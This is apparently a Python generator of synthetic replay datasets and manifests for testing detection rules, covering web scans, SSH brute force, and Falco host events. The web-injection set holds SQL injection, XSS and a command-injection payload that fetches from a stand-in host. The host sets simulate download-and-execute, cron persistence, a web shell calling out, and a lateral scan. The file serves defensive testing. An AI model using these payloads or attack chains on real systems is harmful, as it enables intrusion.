"""Build deterministic P4 replay datasets and content-hashed manifests."""

from __future__ import annotations

import hashlib
import json
from collections.abc import Iterable
from datetime import UTC, datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).resolve().parent
START = datetime(2026, 8, 4, 8, 0, 0, tzinfo=UTC)


def _timestamp(offset_seconds: int) -> str:
    return (START + timedelta(seconds=offset_seconds)).isoformat().replace("+00:00", "Z")


def _http_event(
    index: int,
    *,
    src_ip: str,
    url: str,
    status: int,
    method: str = "GET",
    offset_seconds: int,
) -> dict[str, object]:
    return {
        "event_type": "http",
        "timestamp": _timestamp(offset_seconds),
        "src_ip": src_ip,
        "src_port": 50000 + index,
        "dest_ip": "10.0.0.2",
        "dest_port": 80,
        "proto": "tcp",
        "http": {"http_method": method, "url": url, "status": status},
    }


def _journald_ssh_failure(index: int) -> dict[str, object]:
    event_time = START + timedelta(seconds=index)
    return {
        "__REALTIME_TIMESTAMP": str(int(event_time.timestamp() * 1_000_000)),
        "__MONOTONIC_TIMESTAMP": str(index * 1_000_000),
        "_SYSTEMD_UNIT": "ssh.service",
        "_COMM": "sshd",
        "_PID": 1200,
        "_UID": 0,
        "MESSAGE": (
            f"Failed password for user{index % 3} from 203.0.113.9 port {51000 + index} ssh2"
        ),
    }


def _falco_event(
    index: int,
    *,
    event_type: str,
    process_path: str,
    pid: int,
    offset_seconds: int,
    ppid: int = 1,
    parent_path: str | None = None,
    file_path: str | None = None,
    file_flags: str | None = None,
    dst_ip: str | None = None,
    dst_port: int | None = None,
    result: str = "SUCCESS",
) -> dict[str, object]:
    fields: dict[str, object] = {
        "evt.type": event_type,
        "evt.res": result,
        "proc.exepath": process_path,
        "proc.cmdline": process_path,
        "proc.pid": pid,
        "proc.ppid": ppid,
        "proc.pid.ts": f"178617600000000{index:03d}",
        "user.name": "www-data" if parent_path else "root",
        "user.uid": 33 if parent_path else 0,
    }
    if parent_path is not None:
        fields["proc.pexepath"] = parent_path
        fields["proc.pname"] = parent_path.rsplit("/", 1)[-1]
    if file_path is not None:
        fields["fd.name"] = file_path
    if file_flags is not None:
        fields["evt.arg.flags"] = file_flags
    if dst_ip is not None:
        fields.update(
            {
                "fd.sip": "10.0.0.2",
                "fd.sport": 40000 + index,
                "fd.dip": dst_ip,
                "fd.dport": dst_port or 443,
                "fd.l4proto": "tcp",
            }
        )
    return {
        "time": _timestamp(offset_seconds),
        "rule": "Deterministic P5 replay event",
        "priority": "Warning",
        "output_fields": fields,
    }


def _manifest(
    *,
    name: str,
    description: str,
    source_kind: str,
    expected: list[dict[str, object]],
) -> dict[str, object]:
    return {
        "name": name,
        "version": "0.2.0",
        "description": description,
        "source": "deterministic synthetic",
        "source_kind": source_kind,
        "generator": "tests/replay/build_datasets.py",
        "expected_detections": expected,
        "license": "CC0-1.0",
    }


def _write_dataset(
    name: str,
    events: Iterable[dict[str, object]],
    manifest: dict[str, object],
) -> None:
    directory = ROOT / name
    directory.mkdir(parents=True, exist_ok=True)
    serialized = "".join(
        json.dumps(event, ensure_ascii=False, separators=(",", ":")) + "\n" for event in events
    ).encode("utf-8")
    manifest["events_sha256"] = hashlib.sha256(serialized).hexdigest()
    (directory / "events.jsonl").write_bytes(serialized)
    (directory / "manifest.json").write_text(
        json.dumps(manifest, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )


def main() -> None:
    _write_dataset(
        "web_scan",
        (
            _http_event(
                index,
                src_ip="203.0.113.9",
                url=f"/p{index % 110:03d}",
                status=404,
                offset_seconds=index // 10,
            )
            for index in range(301)
        ),
        _manifest(
            name="web_scan",
            description=(
                "301 requests over 110 paths with 4xx responses in 31 seconds; exceeds the "
                "P4 web reconnaissance thresholds."
            ),
            source_kind="suricata",
            expected=[
                {
                    "category": "web.recon.scanning",
                    "attack_state": "attack_attempt",
                    "min_count": 1,
                    "max_count": 1,
                }
            ],
        ),
    )
    _write_dataset(
        "ssh_bruteforce",
        (_journald_ssh_failure(index) for index in range(11)),
        _manifest(
            name="ssh_bruteforce",
            description=(
                "11 explicit sshd Failed password records across three usernames in 11 seconds."
            ),
            source_kind="journald",
            expected=[
                {
                    "category": "auth.ssh.bruteforce",
                    "attack_state": "attack_attempt",
                    "min_count": 1,
                    "max_count": 1,
                }
            ],
        ),
    )
    benign_paths = [f"/p{index:03d}" for index in range(48)] + [
        "/docs/javascript:introduction",
        "/search?q=union+membership",
    ]
    _write_dataset(
        "normal_baseline",
        (
            _http_event(
                index,
                src_ip="203.0.113.10",
                url=benign_paths[index % len(benign_paths)],
                status=200,
                offset_seconds=index,
            )
            for index in range(200)
        ),
        _manifest(
            name="normal_baseline",
            description=(
                "200 successful requests over 50 benign paths in 200 seconds, including strings "
                "that must not become injection false positives."
            ),
            source_kind="suricata",
            expected=[],
        ),
    )
    _write_dataset(
        "web_injection",
        [
            _http_event(
                0,
                src_ip="203.0.113.11",
                url="/?q=UNION%20SELECT%20password%20FROM%20users",
                status=403,
                offset_seconds=0,
            ),
            _http_event(
                1,
                src_ip="203.0.113.11",
                url="/?q=%3Cscript%3Ealert(1)%3C/script%3E",
                status=200,
                offset_seconds=1,
            ),
            _http_event(
                2,
                src_ip="203.0.113.11",
                url="/run?cmd=%3Bcurl%20http%3A%2F%2Fexample.test%2Fx",
                status=500,
                offset_seconds=2,
            ),
        ],
        _manifest(
            name="web_injection",
            description="Blocked SQLi plus uncorroborated XSS and command-injection attempts.",
            source_kind="suricata",
            expected=[
                {
                    "category": "web.attack.injection",
                    "attack_state": "blocked",
                    "min_count": 1,
                    "max_count": 1,
                },
                {
                    "category": "web.attack.injection",
                    "attack_state": "attack_attempt",
                    "min_count": 2,
                    "max_count": 2,
                },
            ],
        ),
    )

    normal_host_events = [
        _falco_event(
            1000,
            event_type="execve",
            process_path="/usr/sbin/nginx",
            pid=2000,
            ppid=1,
            offset_seconds=0,
        ),
        _falco_event(
            1001,
            event_type="openat",
            process_path="/usr/bin/dpkg",
            pid=2001,
            file_path="/etc/systemd/system/vendor.service",
            file_flags="O_WRONLY|O_CREAT",
            offset_seconds=1,
        ),
        _falco_event(
            1002,
            event_type="execve",
            process_path="/usr/bin/backup-agent",
            pid=2002,
            offset_seconds=2,
        ),
        *[
            _falco_event(
                1010 + index,
                event_type="connect",
                process_path="/usr/bin/backup-agent",
                pid=2002,
                dst_ip=f"10.10.0.{10 + index}",
                dst_port=9100,
                offset_seconds=3 + index,
            )
            for index in range(10)
        ],
        _falco_event(
            1030,
            event_type="openat",
            process_path="/bin/sh",
            pid=2003,
            file_path="/tmp/release/health.txt",
            file_flags="O_WRONLY|O_CREAT|O_TRUNC",
            offset_seconds=20,
        ),
    ]
    _write_dataset(
        "host_normal_baseline",
        normal_host_events,
        _manifest(
            name="host_normal_baseline",
            description=(
                "Normal nginx worker, package-managed systemd unit, ten-host backup sweep, and "
                "temporary release write; none completes a P5 attack chain."
            ),
            source_kind="falco",
            expected=[],
        ),
    )

    failed_host_events = [
        _falco_event(
            1100,
            event_type="execve",
            process_path="/bin/sh",
            parent_path="/usr/sbin/nginx",
            pid=2100,
            ppid=2099,
            result="-EACCES",
            offset_seconds=0,
        ),
        _falco_event(
            1101,
            event_type="execve",
            process_path="/usr/bin/curl",
            pid=2101,
            offset_seconds=1,
        ),
        _falco_event(
            1102,
            event_type="openat",
            process_path="/usr/bin/curl",
            pid=2101,
            file_path="/tmp/blocked",
            file_flags="O_WRONLY|O_CREAT",
            result="-EACCES",
            offset_seconds=2,
        ),
        _falco_event(
            1103,
            event_type="openat",
            process_path="/bin/bash",
            pid=2102,
            file_path="/etc/cron.d/blocked",
            file_flags="O_WRONLY|O_CREAT",
            result="-EPERM",
            offset_seconds=3,
        ),
    ]
    _write_dataset(
        "host_failed_attacks",
        failed_host_events,
        _manifest(
            name="host_failed_attacks",
            description=(
                "Denied web-shell exec, denied downloader write, and denied cron persistence; "
                "failed syscalls must not become suspected-success detections."
            ),
            source_kind="falco",
            expected=[],
        ),
    )

    success_host_events = [
        _falco_event(
            1200,
            event_type="execve",
            process_path="/usr/bin/curl",
            pid=2200,
            offset_seconds=0,
        ),
        _falco_event(
            1201,
            event_type="openat",
            process_path="/usr/bin/curl",
            pid=2200,
            file_path="/tmp/.cache/payload",
            file_flags="O_WRONLY|O_CREAT|O_TRUNC",
            offset_seconds=1,
        ),
        _falco_event(
            1202,
            event_type="chmod",
            process_path="/usr/bin/chmod",
            pid=2201,
            file_path="/tmp/.cache/payload",
            offset_seconds=2,
        ),
        _falco_event(
            1203,
            event_type="execve",
            process_path="/tmp/.cache/payload",
            pid=2202,
            offset_seconds=3,
        ),
        _falco_event(
            1204,
            event_type="openat",
            process_path="/bin/sh",
            pid=2203,
            file_path="/etc/cron.d/system-update",
            file_flags="O_WRONLY|O_CREAT|O_TRUNC",
            offset_seconds=4,
        ),
        _falco_event(
            1205,
            event_type="execve",
            process_path="/bin/bash",
            parent_path="/usr/sbin/nginx",
            pid=2204,
            ppid=2199,
            offset_seconds=5,
        ),
        _falco_event(
            1206,
            event_type="connect",
            process_path="/bin/bash",
            pid=2204,
            dst_ip="8.8.8.8",
            dst_port=443,
            offset_seconds=6,
        ),
        _falco_event(
            1207,
            event_type="execve",
            process_path="/usr/bin/nmap",
            pid=2205,
            offset_seconds=10,
        ),
        *[
            _falco_event(
                1210 + index,
                event_type="connect",
                process_path="/usr/bin/nmap",
                pid=2205,
                dst_ip=f"10.20.0.{10 + index}",
                dst_port=445,
                offset_seconds=11 + index,
            )
            for index in range(20)
        ],
    ]
    # Deliberately send 1/3/2 order and a duplicate write; P5 rules sort by
    # event_time and dedupe event_id before correlating.
    resilient_order = [
        success_host_events[0],
        success_host_events[2],
        success_host_events[1],
        success_host_events[1],
        *success_host_events[3:],
    ]
    _write_dataset(
        "host_success_chains",
        resilient_order,
        _manifest(
            name="host_success_chains",
            description=(
                "Out-of-order and duplicate Falco facts reconstruct download execution, cron "
                "persistence, web-shell outbound traffic, and a twenty-host lateral scan."
            ),
            source_kind="falco",
            expected=[
                {
                    "category": "host.download.execute",
                    "attack_state": "suspected_success",
                    "min_count": 1,
                    "max_count": 1,
                },
                {
                    "category": "host.persistence.change",
                    "attack_state": "suspected_success",
                    "min_count": 1,
                    "max_count": 1,
                },
                {
                    "category": "host.web_process.shell",
                    "attack_state": "suspected_success",
                    "min_count": 1,
                    "max_count": 1,
                },
                {
                    "category": "host.web_shell.outbound",
                    "attack_state": "suspected_success",
                    "min_count": 1,
                    "max_count": 1,
                },
                {
                    "category": "host.lateral.scan",
                    "attack_state": "attack_attempt",
                    "min_count": 1,
                    "max_count": 1,
                },
            ],
        ),
    )

    missing_source_events = [
        *[
            _falco_event(
                1300 + index,
                event_type="connect",
                process_path="/usr/bin/nmap",
                pid=2300,
                dst_ip=f"10.30.0.{10 + index}",
                dst_port=22,
                offset_seconds=index,
            )
            for index in range(20)
        ],
        _falco_event(
            1330,
            event_type="openat",
            process_path="/usr/bin/curl",
            pid=2301,
            file_path="/tmp/orphan",
            file_flags="O_WRONLY|O_CREAT",
            offset_seconds=30,
        ),
        _falco_event(
            1331,
            event_type="chmod",
            process_path="/usr/bin/chmod",
            pid=2302,
            file_path="/tmp/orphan",
            offset_seconds=31,
        ),
        _falco_event(
            1332,
            event_type="execve",
            process_path="/tmp/orphan",
            pid=2303,
            offset_seconds=32,
        ),
    ]
    _write_dataset(
        "host_missing_source",
        missing_source_events,
        _manifest(
            name="host_missing_source",
            description=(
                "Network and file facts lack their process/downloader source events; sequence "
                "rules must fail open to evidence review without inventing a successful chain."
            ),
            source_kind="falco",
            expected=[],
        ),
    )

    skewed_events = [
        _falco_event(
            1400,
            event_type="execve",
            process_path="/usr/bin/wget",
            pid=2400,
            offset_seconds=0,
        ),
        _falco_event(
            1401,
            event_type="openat",
            process_path="/usr/bin/wget",
            pid=2400,
            file_path="/tmp/skewed",
            file_flags="O_WRONLY|O_CREAT",
            offset_seconds=1,
        ),
        _falco_event(
            1402,
            event_type="chmod",
            process_path="/usr/bin/chmod",
            pid=2401,
            file_path="/tmp/skewed",
            offset_seconds=2,
        ),
        _falco_event(
            1403,
            event_type="execve",
            process_path="/tmp/skewed",
            pid=2402,
            offset_seconds=1000,
        ),
    ]
    _write_dataset(
        "host_clock_skew",
        skewed_events,
        _manifest(
            name="host_clock_skew",
            description=(
                "The final exec is timestamped outside the five-minute chain window; the partial "
                "facts remain evidence but do not produce a successful download-execute chain."
            ),
            source_kind="falco",
            expected=[],
        ),
    )


if __name__ == "__main__":
    main()
